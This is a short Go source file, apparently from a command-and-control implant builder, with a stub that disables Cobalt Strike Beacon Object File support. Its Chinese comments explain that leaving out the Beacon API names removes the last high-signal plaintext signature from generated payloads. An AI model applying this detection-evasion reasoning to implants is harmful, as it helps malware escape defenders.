//go:build windows && !light && !bof

package main

// BOF（Cobalt Strike Beacon Object File）支持的**默认实现**：不编译 bof_windows.go。
//
// 为什么默认关闭（v1.3.5 起）：
//   - BOF 兼容层必须导出 `BeaconDataParse` / `BeaconOutput` / `BeaconPrintf` /
//     `BeaconInjectProcess` 等一整套 **Cobalt Strike Beacon API 名字**——BOF 二进制靠
//     这些名字解析符号，是不能改写的 ABI 契约；
//   - 实测在载荷里这些名字有 22 处明文命中（Go 的 pclntab 会保留函数名，`-s -w` 去不掉），
//     是 full 档案里唯一剩下的高信号明文特征；
//   - 不用 BOF 时完全没有必要携带这套 API 面。
//
// 需要用 BOF 时，在生成载荷页勾选「BOF 支持」（服务端加 `-tags bof`）即可。
func loadBOF(data string, args string) (string, int32, string) {
	return "", -1, "BOF 未编译进本载荷（生成载荷时勾选「BOF 支持」后重新构建）"
}
